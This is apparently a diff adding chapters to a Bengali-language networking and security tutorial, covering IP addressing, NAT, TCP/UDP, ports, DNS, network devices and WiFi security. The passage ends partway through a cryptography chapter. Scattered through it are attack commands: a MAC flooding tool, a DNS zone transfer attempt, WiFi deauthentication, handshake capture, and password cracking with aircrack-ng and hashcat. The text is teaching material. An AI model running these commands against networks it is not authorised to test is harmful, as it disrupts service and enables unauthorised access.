+        <tr><td><strong>Public IP</strong></td><td>বাকি সব</td><td>ইন্টারনেট</td><td>সরাসরি অ্যাক্সেসযোগ্য — সুরক্ষা প্রয়োজন</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">NAT (Network Address Translation)</h2>
+    <p>NAT হলো এমন একটি পদ্ধতি যেখানে Router একটি Public IP দিয়ে অনেকগুলো Private IP ডিভাইসকে ইন্টারনেট অ্যাক্সেস দেয়।</p>
+
+    <div class="diagram">
+<pre>
+তোমার বাড়ির নেটওয়ার্ক:
+মোবাইল: 192.168.1.2  ──┐
+ল্যাপটপ: 192.168.1.3  ──┤──→ Router (NAT) ──→ Internet
+স্মার্ট TV: 192.168.1.4 ──┘     Public IP: 103.x.x.x
+
+বাইরে থেকে শুধু 103.x.x.x দেখা যায়।
+কে কোন ডিভাইস সেটা লুকানো থাকে।
+</pre>
+    </div>
+
+    <h2 class="section-title">সাবনেটিং (Subnetting)</h2>
+    <p>সাবনেটিং হলো একটি বড় নেটওয়ার্ককে ছোট ছোট অংশে (সাবনেট) ভাগ করা। সিকিউরিটির জন্য এটি অত্যন্ত গুরুত্বপূর্ণ কারণ আলাদা ডিপার্টমেন্টকে আলাদা সাবনেটে রাখলে একটি হ্যাক হলে অন্যটি সুরক্ষিত থাকে।</p>
+
+    <h3 class="sub-title">CIDR Notation (সিডার নোটেশন)</h3>
+    <table>
+      <thead><tr><th>CIDR</th><th>Subnet Mask</th><th>মোট IP</th><th>ব্যবহারযোগ্য Host</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>/8</td><td>255.0.0.0</td><td>১৬,৭৭৭,২১৬</td><td>১৬,৭৭৭,২১৪</td><td>বিশাল ISP নেটওয়ার্ক</td></tr>
+        <tr><td>/16</td><td>255.255.0.0</td><td>৬৫,৫৩৬</td><td>৬৫,৫৩৪</td><td>বড় কর্পোরেট</td></tr>
+        <tr><td>/24</td><td>255.255.255.0</td><td>২৫৬</td><td>২৫৪</td><td>সাধারণ অফিস/হোম</td></tr>
+        <tr><td>/25</td><td>255.255.255.128</td><td>১২৮</td><td>১২৬</td><td>বিভাগীয় নেটওয়ার্ক</td></tr>
+        <tr><td>/30</td><td>255.255.255.252</td><td>৪</td><td>২</td><td>Router-to-Router Link</td></tr>
+        <tr><td>/32</td><td>255.255.255.255</td><td>১</td><td>১</td><td>একটি নির্দিষ্ট Host</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">IPv6 বিস্তারিত</h2>
+    <p>IPv4 ঠিকানা শেষ হয়ে যাওয়ায় IPv6 তৈরি হয়েছে। এটি ১২৮-বিটের।</p>
+
+    <div class="diagram">
+<pre>
+IPv6 উদাহরণ:
+2001:0db8:85a3:0000:0000:8a2e:0370:7334
+
+সংক্ষিপ্ত রূপ:
+2001:db8:85a3::8a2e:370:7334
+
+মোট সম্ভাব্য IP: 2^128 = 340 undecillion (প্রায় অসীম!)
+
+বিশেষ IPv6 ঠিকানা:
+::1          → Loopback (127.0.0.1 এর মতো)
+::           → Unspecified
+fe80::/10    → Link-local
+ff00::/8     → Multicast
+</pre>
+    </div>
+
+    <h3 class="sub-title">IPv4 vs IPv6 তুলনা</h3>
+    <table>
+      <thead><tr><th>বিষয়</th><th>IPv4</th><th>IPv6</th></tr></thead>
+      <tbody>
+        <tr><td>বিট সংখ্যা</td><td>32 bit</td><td>128 bit</td></tr>
+        <tr><td>ঠিকানা সংখ্যা</td><td>~৪.৩ বিলিয়ন</td><td>340 undecillion</td></tr>
+        <tr><td>NAT প্রয়োজন?</td><td>হ্যাঁ</td><td>না</td></tr>
+        <tr><td>IPsec বাধ্যতামূলক?</td><td>না</td><td>হ্যাঁ</td></tr>
+        <tr><td>Header সাইজ</td><td>Variable</td><td>Fixed (40 bytes)</td></tr>
+        <tr><td>Broadcast</td><td>আছে</td><td>নেই (Multicast আছে)</td></tr>
+        <tr><td>সিকিউরিটি ঝুঁকি</td><td>ARP Spoofing</td><td>NDP Spoofing, Router Advertisement Attack</td></tr>
+      </tbody>
+    </table>
+
+    <div class="box box-warning">
+      <div class="box-title">⚠️ সিকিউরিটি পেনটেস্টিং টিপ</div>
+      IP স্ক্যান করার সময় IPv6 ভুলে যাবে না! অনেক সিস্টেম IPv6 দিয়ে চলে কিন্তু Firewall শুধু IPv4 ব্লক করে। IPv6 দিয়ে bypass করা যেতে পারে।
+      <div class="code-block">nmap -6 target.com   <span class="comment"># IPv6 স্ক্যান</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 4 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 04</div>
+    <div class="chapter-title">📡 গুরুত্বপূর্ণ নেটওয়ার্ক প্রোটোকল</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">TCP vs UDP — সবচেয়ে গুরুত্বপূর্ণ পার্থক্য</h2>
+
+    <div class="grid-2">
+      <div class="grid-card">
+        <h4>🔵 TCP (Transmission Control Protocol)</h4>
+        <p><strong>Connection-oriented</strong> — আগে সংযোগ স্থাপন করে</p>
+        <ul>
+          <li>Three-Way Handshake: SYN → SYN-ACK → ACK</li>
+          <li>নির্ভরযোগ্য — প্যাকেট হারিয়ে গেলে পুনরায় পাঠায়</li>
+          <li>ক্রমানুযায়ী ডেটা পৌঁছানো নিশ্চিত করে</li>
+          <li>ধীরগতি কিন্তু নির্ভরযোগ্য</li>
+          <li>ব্যবহার: HTTP, HTTPS, FTP, SSH, SMTP</li>
+        </ul>
+        <p><strong>সিকিউরিটি ঝুঁকি:</strong> SYN Flood, Session Hijacking</p>
+      </div>
+      <div class="grid-card">
+        <h4>🟠 UDP (User Datagram Protocol)</h4>
+        <p><strong>Connectionless</strong> — সংযোগ ছাড়াই পাঠায়</p>
+        <ul>
+          <li>কোনো Handshake নেই</li>
+          <li>অনির্ভরযোগ্য — হারানো প্যাকেট পুনরায় পাঠায় না</li>
+          <li>ক্রম নিশ্চিত নয়</li>
+          <li>দ্রুতগতি</li>
+          <li>ব্যবহার: DNS, DHCP, VoIP, Video streaming, Gaming</li>
+        </ul>
+        <p><strong>সিকিউরিটি ঝুঁকি:</strong> UDP Flood, DNS Amplification</p>
+      </div>
+    </div>
+
+    <h3 class="sub-title">TCP Three-Way Handshake বিস্তারিত</h3>
+    <div class="diagram">
+<pre>
+Client                    Server
+  |                          |
+  |──── SYN (seq=100) ──────→|   "হ্যালো, কথা বলতে চাই"
+  |                          |
+  |←── SYN-ACK (seq=200, ───|   "ঠিক আছে, প্রস্তুত আছি"
+  |     ack=101)             |
+  |                          |
+  |──── ACK (ack=201) ──────→|   "চমৎকার, শুরু করা যাক"
+  |                          |
+  |═══════ Data Flow ════════|
+
+SYN Flood Attack:
+Client (Hacker)           Server
+  |──── SYN ───────────────→|
+  |──── SYN ───────────────→|  সার্ভার অনেক SYN-ACK
+  |──── SYN ───────────────→|  পাঠায় কিন্তু ACK আসে না
+  |──── SYN ───────────────→|  → সার্ভারের মেমোরি ভরে যায়
+  |                          |  → Legitimate connection reject করে
+</pre>
+    </div>
+
+    <h2 class="section-title">HTTP ও HTTPS</h2>
+
+    <h3 class="sub-title">HTTP (HyperText Transfer Protocol) — পোর্ট 80</h3>
+    <p>ওয়েব ব্রাউজার ও ওয়েব সার্ভারের মধ্যে যোগাযোগের প্রোটোকল। HTTP সম্পূর্ণ অনিরাপদ — সব ডেটা Plaintext-এ যায়।</p>
+
+    <div class="code-block">
+<span class="comment"># HTTP Request উদাহরণ (Wireshark-এ দেখা যায়):</span>
+GET /login HTTP/1.1
+Host: example.com
+Cookie: session=abc123
+Authorization: Basic dXNlcjpwYXNz   <span class="comment"># Base64 encoded "user:pass"</span>
+
+<span class="comment"># HTTP Response:</span>
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: sessionid=xyz789; HttpOnly; Secure
+    </div>
+
+    <h3 class="sub-title">HTTPS — পোর্ট 443</h3>
+    <p>HTTP + TLS/SSL = HTTPS। ডেটা এনক্রিপ্ট করে পাঠায়। সিকিউরিটির জন্য সব সাইটে HTTPS থাকা উচিত।</p>
+
+    <table>
+      <thead><tr><th>বিষয়</th><th>HTTP</th><th>HTTPS</th></tr></thead>
+      <tbody>
+        <tr><td>পোর্ট</td><td>80</td><td>443</td></tr>
+        <tr><td>এনক্রিপশন</td><td>নেই</td><td>TLS/SSL</td></tr>
+        <tr><td>Wireshark-এ দেখা যায়?</td><td>হ্যাঁ</td><td>না (encrypted)</td></tr>
+        <tr><td>Certificate</td><td>নেই</td><td>SSL Certificate প্রয়োজন</td></tr>
+        <tr><td>MITM সম্ভব?</td><td>সহজেই</td><td>কঠিন (Certificate pinning থাকলে)</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">DNS — ডোমেইন নেম সিস্টেম (পোর্ট 53)</h2>
+    <p>DNS ইন্টারনেটের ফোনবুক। Domain Name কে IP Address-এ রূপান্তর করে।</p>
+
+    <div class="code-block">
+nslookup google.com        <span class="comment"># DNS লুকআপ</span>
+dig google.com ANY         <span class="comment"># সব DNS রেকর্ড দেখা</span>
+host -a facebook.com       <span class="comment"># DNS রেকর্ড বিস্তারিত</span>
+    </div>
+
+    <h2 class="section-title">DHCP — ডায়নামিক হোস্ট কনফিগারেশন (পোর্ট 67/68)</h2>
+    <p>DHCP স্বয়ংক্রিয়ভাবে নেটওয়ার্ক ডিভাইসকে IP Address, Subnet Mask, Default Gateway ও DNS দেয়।</p>
+
+    <div class="diagram">
+<pre>
+DHCP DORA Process:
+Client              DHCP Server
+  |─── Discover ──────────→|   "কেউ IP দেবে?"
+  |←── Offer ─────────────|   "192.168.1.100 নাও"
+  |─── Request ───────────→|   "ঠিক আছে, ওটাই চাই"
+  |←── ACK ───────────────|   "নাও, লিজ দিলাম"
+
+DHCP Starvation Attack:
+হ্যাকার লক্ষ লক্ষ Discover পাঠিয়ে সব IP নিয়ে নেয়
+→ নতুন ডিভাইস IP পায় না → DoS
+</pre>
+    </div>
+
+    <h2 class="section-title">SSH — সিকিউর শেল (পোর্ট 22)</h2>
+    <p>SSH এনক্রিপ্টেড কমান্ড-লাইন অ্যাক্সেস দেয়। Telnet (পোর্ট 23) এর নিরাপদ বিকল্প।</p>
+
+    <div class="code-block">
+<span class="comment"># SSH সংযোগ</span>
+ssh username@192.168.1.100
+ssh -p 2222 user@server.com    <span class="comment"># কাস্টম পোর্ট</span>
+ssh -i key.pem user@server     <span class="comment"># Private key দিয়ে</span>
+
+<span class="comment"># SSH Key তৈরি</span>
+ssh-keygen -t ed25519 -C "comment"
+
+<span class="comment"># সিকিউরিটি: SSH Config পরিবর্তন</span>
+<span class="comment"># /etc/ssh/sshd_config:</span>
+PermitRootLogin no
+PasswordAuthentication no
+Port 2222
+    </div>
+
+    <h2 class="section-title">গুরুত্বপূর্ণ পোর্ট নম্বর — সম্পূর্ণ তালিকা</h2>
+    <table>
+      <thead><tr><th>পোর্ট</th><th>প্রোটোকল</th><th>সার্ভিস</th><th>সিকিউরিটি নোট</th></tr></thead>
+      <tbody>
+        <tr><td><span class="port-badge">20/21</span></td><td>TCP</td><td>FTP</td><td>Plaintext, ব্যবহার করবেন না। SFTP ব্যবহার করুন।</td></tr>
+        <tr><td><span class="port-badge">22</span></td><td>TCP</td><td>SSH</td><td>নিরাপদ। Default পোর্ট পরিবর্তন করুন।</td></tr>
+        <tr><td><span class="port-badge">23</span></td><td>TCP</td><td>Telnet</td><td>অত্যন্ত অনিরাপদ, ব্যবহার করবেন না!</td></tr>
+        <tr><td><span class="port-badge">25</span></td><td>TCP</td><td>SMTP</td><td>ইমেইল পাঠানো। Spam ও Email Spoofing ঝুঁকি।</td></tr>
+        <tr><td><span class="port-badge">53</span></td><td>TCP/UDP</td><td>DNS</td><td>DNS Spoofing, DNS Amplification Attack ঝুঁকি।</td></tr>
+        <tr><td><span class="port-badge">67/68</span></td><td>UDP</td><td>DHCP</td><td>Rogue DHCP Server, Starvation Attack ঝুঁকি।</td></tr>
+        <tr><td><span class="port-badge">80</span></td><td>TCP</td><td>HTTP</td><td>Plaintext ওয়েব। HTTPS ব্যবহার করুন।</td></tr>
+        <tr><td><span class="port-badge">110</span></td><td>TCP</td><td>POP3</td><td>ইমেইল রিসিভ। Plaintext।</td></tr>
+        <tr><td><span class="port-badge">135</span></td><td>TCP</td><td>RPC</td><td>Windows। অনেক Exploit পাওয়া গেছে।</td></tr>
+        <tr><td><span class="port-badge">139/445</span></td><td>TCP</td><td>SMB</td><td>EternalBlue (WannaCry)! সবচেয়ে বিপজ্জনক।</td></tr>
+        <tr><td><span class="port-badge">143</span></td><td>TCP</td><td>IMAP</td><td>ইমেইল। SSL ছাড়া Plaintext।</td></tr>
+        <tr><td><span class="port-badge">443</span></td><td>TCP</td><td>HTTPS</td><td>নিরাপদ ওয়েব।</td></tr>
+        <tr><td><span class="port-badge">445</span></td><td>TCP</td><td>SMB/CIFS</td><td>Windows File Sharing। খুবই বিপজ্জনক!</td></tr>
+        <tr><td><span class="port-badge">3306</span></td><td>TCP</td><td>MySQL</td><td>ডেটাবেস। কখনো Public-এ খোলা রাখবেন না।</td></tr>
+        <tr><td><span class="port-badge">3389</span></td><td>TCP</td><td>RDP</td><td>Remote Desktop। Brute Force ও BlueKeep ঝুঁকি।</td></tr>
+        <tr><td><span class="port-badge">5432</span></td><td>TCP</td><td>PostgreSQL</td><td>ডেটাবেস। Public-এ expose করবেন না।</td></tr>
+        <tr><td><span class="port-badge">6379</span></td><td>TCP</td><td>Redis</td><td>প্রায়ই Auth ছাড়া Public-এ খোলা থাকে!</td></tr>
+        <tr><td><span class="port-badge">8080/8443</span></td><td>TCP</td><td>HTTP Alt</td><td>Development Server, প্রায়ই দুর্বল।</td></tr>
+        <tr><td><span class="port-badge">27017</span></td><td>TCP</td><td>MongoDB</td><td>প্রায়ই Auth ছাড়া Public-এ খোলা থাকে!</td></tr>
+      </tbody>
+    </table>
+
+  </div>
+</div>
+
+<!-- CHAPTER 5 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 05</div>
+    <div class="chapter-title">🖥️ নেটওয়ার্ক ডিভাইস</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">প্রধান নেটওয়ার্ক ডিভাইস</h2>
+
+    <h3 class="sub-title">Hub — লেয়ার ১</h3>
+    <p>Hub সব পোর্টে ডেটা ব্রডকাস্ট করে। সিকিউরিটির দৃষ্টিকোণ থেকে অত্যন্ত বিপজ্জনক কারণ যেকোনো ডিভাইস সব ট্র্যাফিক দেখতে পারে। আধুনিক নেটওয়ার্কে Hub ব্যবহার হয় না।</p>
+
+    <h3 class="sub-title">Switch — লেয়ার ২</h3>
+    <p>Switch MAC Address টেবিল ব্যবহার করে সঠিক পোর্টে ডেটা পাঠায়। Hub-এর চেয়ে নিরাপদ কিন্তু ARP Spoofing ও MAC Flooding-এর মাধ্যমে আক্রান্ত হতে পারে।</p>
+
+    <div class="box box-danger">
+      <div class="box-title">⚠️ MAC Flooding Attack</div>
+      হ্যাকার হাজার হাজার নকল MAC Address দিয়ে Switch-এর CAM Table ভরিয়ে দেয়। ফলে Switch একটি Hub-এর মতো আচরণ করে এবং সব ট্র্যাফিক সব পোর্টে ব্রডকাস্ট করে।
+      <div class="code-block">macof -i eth0   <span class="comment"># MAC Flooding টুল (Kali Linux)</span></div>
+    </div>
+
+    <h3 class="sub-title">Router — লেয়ার ৩</h3>
+    <p>Router নেটওয়ার্কের মধ্যে ট্র্যাফিক রাউটিং করে। IP Address ব্যবহার করে সেরা পাথ নির্ধারণ করে।</p>
+
+    <h3 class="sub-title">Firewall — সবচেয়ে গুরুত্বপূর্ণ সিকিউরিটি ডিভাইস</h3>
+    <p>Firewall নেটওয়ার্ক ট্র্যাফিক ফিল্টার করে। নির্দিষ্ট নিয়ম (Rules) অনুযায়ী ট্র্যাফিক Allow বা Block করে।</p>
+
+    <table>
+      <thead><tr><th>Firewall ধরন</th><th>কাজ</th><th>সুবিধা</th><th>সীমাবদ্ধতা</th></tr></thead>
+      <tbody>
+        <tr><td>Packet Filter</td><td>IP, Port দেখে block করে</td><td>দ্রুত</td><td>Deep inspection করে না</td></tr>
+        <tr><td>Stateful</td><td>Connection state ট্র্যাক করে</td><td>নির্ভরযোগ্য</td><td>Application layer দেখে না</td></tr>
+        <tr><td>Application (WAF)</td><td>HTTP payload বিশ্লেষণ করে</td><td>সবচেয়ে নিরাপদ</td><td>ধীরগতি, ব্যয়বহুল</td></tr>
+        <tr><td>Next-Gen (NGFW)</td><td>সব একসাথে + IDS/IPS</td><td>সর্বোচ্চ সুরক্ষা</td><td>সবচেয়ে ব্যয়বহুল</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub-title">IDS ও IPS</h3>
+    <table>
+      <thead><tr><th>বিষয়</th><th>IDS (Intrusion Detection System)</th><th>IPS (Intrusion Prevention System)</th></tr></thead>
+      <tbody>
+        <tr><td>কাজ</td><td>অ্যাটাক সনাক্ত করে Alert পাঠায়</td><td>অ্যাটাক সনাক্ত করে স্বয়ংক্রিয়ভাবে ব্লক করে</td></tr>
+        <tr><td>পজিশন</td><td>নেটওয়ার্কের বাইরে (Passive)</td><td>ট্র্যাফিকের মাঝে (Inline)</td></tr>
+        <tr><td>সুবিধা</td><td>False Positive-এ ক্ষতি নেই</td><td>Real-time সুরক্ষা</td></tr>
+        <tr><td>সীমাবদ্ধতা</td><td>নিজে block করতে পারে না</td><td>False Positive হলে legitimate traffic block</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub-title">Proxy Server</h3>
+    <p>Proxy হলো মধ্যবর্তী সার্ভার যা Client ও Internet-এর মধ্যে কাজ করে।</p>
+    <ul>
+      <li><strong>Forward Proxy:</strong> Client-এর পক্ষে Internet-এ রিকোয়েস্ট করে (Client IP লুকায়)</li>
+      <li><strong>Reverse Proxy:</strong> Server-এর পক্ষে Client রিকোয়েস্ট গ্রহণ করে (Server IP লুকায়) — Nginx, Cloudflare</li>
+      <li><strong>Transparent Proxy:</strong> ব্যবহারকারী জানে না Proxy আছে</li>
+    </ul>
+
+  </div>
+</div>
+
+<!-- CHAPTER 6 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 06</div>
+    <div class="chapter-title">🔍 DNS বিস্তারিত</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">DNS কীভাবে কাজ করে?</h2>
+
+    <div class="diagram">
+<pre>
+তুমি browser-এ টাইপ করলে: www.google.com
+
+১. Browser Cache চেক করে
+          ↓ না পেলে
+২. OS Cache (/etc/hosts) চেক করে
+          ↓ না পেলে
+৩. Recursive Resolver (ISP DNS) কে জিজ্ঞেস করে
+          ↓ না জানলে
+৪. Root DNS Server (.) জিজ্ঞেস করে → .com কে জানে
+          ↓
+৫. TLD DNS Server (.com) জিজ্ঞেস করে → google.com কে জানে
+          ↓
+৬. Authoritative DNS Server (Google) → 142.250.x.x
+          ↓
+৭. Browser পায় IP: 142.250.x.x
+          ↓
+৮. Browser connect করে 142.250.x.x:443 এ
+</pre>
+    </div>
+
+    <h2 class="section-title">DNS Record Types</h2>
+    <table>
+      <thead><tr><th>Record</th><th>কাজ</th><th>উদাহরণ</th><th>সিকিউরিটি প্রাসঙ্গিকতা</th></tr></thead>
+      <tbody>
+        <tr><td><strong>A</strong></td><td>Domain → IPv4</td><td>google.com → 142.250.x.x</td><td>সবচেয়ে বেশি ব্যবহৃত, Subdomain Takeover</td></tr>
+        <tr><td><strong>AAAA</strong></td><td>Domain → IPv6</td><td>google.com → 2607:f8b0::...</td><td>IPv6 হ্যাকিং</td></tr>
+        <tr><td><strong>CNAME</strong></td><td>Alias → অন্য Domain</td><td>www → google.com</td><td>Subdomain Takeover ঝুঁকি</td></tr>
+        <tr><td><strong>MX</strong></td><td>Mail Server</td><td>mail.google.com</td><td>Email Spoofing, SPF/DKIM চেক</td></tr>
+        <tr><td><strong>TXT</strong></td><td>টেক্সট তথ্য</td><td>SPF, DKIM, DMARC রেকর্ড</td><td>Email authentication</td></tr>
+        <tr><td><strong>NS</strong></td><td>Name Server</td><td>ns1.google.com</td><td>DNS Hijacking টার্গেট</td></tr>
+        <tr><td><strong>PTR</strong></td><td>IP → Domain (Reverse)</td><td>142.250.x.x → google.com</td><td>Reverse DNS lookup</td></tr>
+        <tr><td><strong>SOA</strong></td><td>DNS Zone তথ্য</td><td>Zone transfer info</td><td>Zone Transfer Attack</td></tr>
+        <tr><td><strong>SRV</strong></td><td>Service Location</td><td>_http._tcp.example.com</td><td>Service Discovery</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">DNS অ্যাটাক</h2>
+
+    <h3 class="sub-title">১. DNS Spoofing / Cache Poisoning</h3>
+    <p>হ্যাকার DNS Cache-এ ভুয়া রেকর্ড ঢুকিয়ে দেয়। ব্যবহারকারী সঠিক domain টাইপ করলেও হ্যাকারের সার্ভারে চলে যায়।</p>
+
+    <h3 class="sub-title">২. DNS Zone Transfer</h3>
+    <p>Zone Transfer ভুলভাবে কনফিগার থাকলে সব DNS রেকর্ড (সব subdomain সহ) একসাথে বের করা যায়।</p>
+    <div class="code-block">
+dig axfr @ns1.target.com target.com   <span class="comment"># Zone Transfer চেষ্টা</span>
+    </div>
+
+    <h3 class="sub-title">৩. DNS Amplification DDoS</h3>
+    <p>UDP-র spoofed packet দিয়ে DNS সার্ভারকে victim-এর IP-তে বড় Response পাঠাতে বলে। ছোট request-এ বড় response → ট্র্যাফিক amplification।</p>
+
+    <h3 class="sub-title">৪. DNS Tunneling</h3>
+    <p>Firewall bypass করতে DNS প্যাকেটের মধ্যে ডেটা লুকিয়ে পাঠানো।</p>
+
+    <div class="code-block">
+<span class="comment"># DNS Enumeration টুল (Kali Linux)</span>
+dnsenum target.com
+fierce --domain target.com
+dnsrecon -d target.com
+subfinder -d target.com
+    </div>
+
+    <div class="box box-success">
+      <div class="box-title">✅ DNS সুরক্ষা</div>
+      <ul>
+        <li>DNSSEC ব্যবহার করুন (DNS রেকর্ড সাইন করা)</li>
+        <li>Zone Transfer শুধু Authorized Server-এ সীমিত করুন</li>
+        <li>SPF, DKIM, DMARC রেকর্ড যোগ করুন (Email Spoofing ঠেকাতে)</li>
+        <li>DNS over HTTPS (DoH) বা DNS over TLS (DoT) ব্যবহার করুন</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 7 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 07</div>
+    <div class="chapter-title">📶 ওয়্যারলেস নেটওয়ার্কিং ও সিকিউরিটি</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">WiFi স্ট্যান্ডার্ড</h2>
+    <table>
+      <thead><tr><th>স্ট্যান্ডার্ড</th><th>নাম</th><th>ফ্রিকোয়েন্সি</th><th>সর্বোচ্চ গতি</th><th>পরিসর</th></tr></thead>
+      <tbody>
+        <tr><td>802.11a</td><td>WiFi 1</td><td>5 GHz</td><td>54 Mbps</td><td>কম</td></tr>
+        <tr><td>802.11b</td><td>WiFi 2</td><td>2.4 GHz</td><td>11 Mbps</td><td>বেশি</td></tr>
+        <tr><td>802.11g</td><td>WiFi 3</td><td>2.4 GHz</td><td>54 Mbps</td><td>বেশি</td></tr>
+        <tr><td>802.11n</td><td>WiFi 4</td><td>2.4/5 GHz</td><td>600 Mbps</td><td>বেশি</td></tr>
+        <tr><td>802.11ac</td><td>WiFi 5</td><td>5 GHz</td><td>3.5 Gbps</td><td>মাঝারি</td></tr>
+        <tr><td>802.11ax</td><td>WiFi 6</td><td>2.4/5/6 GHz</td><td>9.6 Gbps</td><td>ভালো</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">WiFi সিকিউরিটি প্রোটোকল</h2>
+
+    <h3 class="sub-title">WEP (Wired Equivalent Privacy) — ব্যবহার করবেন না!</h3>
+    <p>১৯৯৭ সালে তৈরি। RC4 encryption ব্যবহার করে। মাত্র কয়েক মিনিটে crack করা যায়।</p>
+    <div class="code-block">
+aircrack-ng capture.cap   <span class="comment"># WEP crack (Kali Linux) — মিনিটেই ভাঙে</span>
+    </div>
+
+    <h3 class="sub-title">WPA (WiFi Protected Access)</h3>
+    <p>WEP-এর উন্নত বিকল্প। TKIP encryption ব্যবহার করে। এখনো দুর্বল।</p>
+
+    <h3 class="sub-title">WPA2 — সবচেয়ে বেশি ব্যবহৃত</h3>
+    <p>AES-CCMP encryption ব্যবহার করে। দুটি মোড:</p>
+    <ul>
+      <li><strong>WPA2-Personal (PSK):</strong> একটি পাসওয়ার্ড সবার জন্য। হোম নেটওয়ার্কে ব্যবহার।</li>
+      <li><strong>WPA2-Enterprise:</strong> RADIUS Server দিয়ে আলাদা authentication। অফিস নেটওয়ার্কে।</li>
+    </ul>
+    <p><strong>দুর্বলতা:</strong> PMKID ও 4-Way Handshake ক্যাপচার করে offline brute force।</p>
+
+    <h3 class="sub-title">WPA3 — সর্বশেষ ও সবচেয়ে নিরাপদ</h3>
+    <p>SAE (Simultaneous Authentication of Equals) ব্যবহার করে। Dictionary Attack প্রতিরোধ করে।</p>
+
+    <h2 class="section-title">ওয়্যারলেস অ্যাটাক</h2>
+
+    <h3 class="sub-title">১. Evil Twin Attack</h3>
+    <div class="diagram">
+<pre>
+আসল AP: "HomeWiFi" (BSSID: AA:BB:CC)
+হ্যাকারের AP: "HomeWiFi" (জোরালো সিগন্যাল দিয়ে)
+
+ব্যবহারকারীর ডিভাইস হ্যাকারের AP-তে connect করে
+→ সব ট্র্যাফিক হ্যাকারের মধ্য দিয়ে যায়
+→ Captive portal দেখিয়ে পাসওয়ার্ড চুরি
+</pre>
+    </div>
+
+    <h3 class="sub-title">২. Deauthentication Attack</h3>
+    <p>802.11 Management Frame-এ authentication নেই। হ্যাকার Deauth Frame পাঠিয়ে সব ডিভাইস disconnect করতে পারে। এরপর WPA Handshake ক্যাপচার করা যায়।</p>
+    <div class="code-block">
+airmon-ng start wlan0                        <span class="comment"># Monitor mode চালু</span>
+airodump-ng wlan0mon                         <span class="comment"># নেটওয়ার্ক স্ক্যান</span>
+aireplay-ng --deauth 100 -a [BSSID] wlan0mon <span class="comment"># Deauth Attack</span>
+    </div>
+
+    <h3 class="sub-title">৩. WPA Handshake Capture ও Crack</h3>
+    <div class="code-block">
+<span class="comment"># Handshake ক্যাপচার</span>
+airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
+
+<span class="comment"># Crack করা (Dictionary Attack)</span>
+aircrack-ng -w rockyou.txt capture.cap
+hashcat -m 22000 capture.hc22000 rockyou.txt
+    </div>
+
+    <div class="box box-success">
+      <div class="box-title">✅ ওয়্যারলেস সিকিউরিটি টিপস</div>
+      <ul>
+        <li>WPA3 ব্যবহার করুন বা WPA2 AES</li>
+        <li>দীর্ঘ ও জটিল WiFi পাসওয়ার্ড ব্যবহার করুন (২০+ অক্ষর)</li>
+        <li>SSID Broadcast বন্ধ করুন (কিছুটা সুরক্ষা দেয়)</li>
+        <li>MAC Filtering চালু করুন (100% নিরাপদ নয়, কিন্তু অতিরিক্ত স্তর)</li>
+        <li>Guest Network আলাদা রাখুন</li>
+        <li>WiFi Analyzer দিয়ে নিয়মিত পার্শ্ববর্তী নেটওয়ার্ক মনিটর করুন</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- CHAPTER 8 -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">CHAPTER 08</div>
+    <div class="chapter-title">🔐 ক্রিপ্টোগ্রাফি</div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="section-title">ক্রিপ্টোগ্রাফি কী?</h2>
+    <p>ক্রিপ্টোগ্রাফি হলো তথ্য এনক্রিপ্ট করে অননুমোদিত অ্যাক্সেস থেকে রক্ষা করার বিজ্ঞান। Confidentiality, Integrity, Authentication — তিনটিই নিশ্চিত করে।</p>
+
+    <h2 class="section-title">Symmetric Encryption (প্রতিসম এনক্রিপশন)</h2>
+    <p>একই Key দিয়ে Encrypt ও Decrypt করা হয়।</p>
+
+    <div class="diagram">
+<pre>
+Sender                              Receiver
+  |                                    |
+  | Plain: "Hello"                     |
+  | Key: "SecretKey123"                |
+  |                                    |
+  | Encrypt → "X7$mK9#"  ──────────→ | 
+  |                                    | Decrypt (same key)
+  |                                    | → "Hello"
+
+সমস্যা: Key কীভাবে নিরাপদে পাঠাবে?
+</pre>
+    </div>
+
+    <table>
+      <thead><tr><th>অ্যালগরিদম</th><th>Key Size</th><th>ব্লক Size</th><th>স্ট্যাটাস</th><th>ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td>DES</td><td>56-bit</td><td>64-bit</td><td>❌ ভাঙা (ব্যবহার করবেন না)</td><td>পুরনো সিস্টেম</td></tr>
+        <tr><td>3DES</td><td>168-bit</td><td>64-bit</td><td>⚠️ দুর্বল হচ্ছে</td><td>Legacy</td></tr>
+        <tr><td><strong>AES-128</strong></td><td>128-bit</td><td>128-bit</td><td>✅ নিরাপদ</td><td>WPA2, TLS</td></tr>
+        <tr><td><strong>AES-256</strong></td><td>256-bit</td><td>128-bit</td><td>✅ সর্বোচ্চ নিরাপদ</td><td>Military, HTTPS</td></tr>
+        <tr><td>ChaCha20</td><td>256-bit</td><td>Stream</td><td>✅ নিরাপদ</td><td>TLS 1.3, Mobile</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="section-title">Asymmetric Encryption (অপ্রতিসম এনক্রিপশন)</h2>
+    <p>দুটি Key — Public Key (সবাইকে দেওয়া যায়) ও Private Key (শুধু নিজের কাছে)।</p>
+
+    <div class="diagram">
+<pre>
+Sender                              Receiver
+  |                                    |
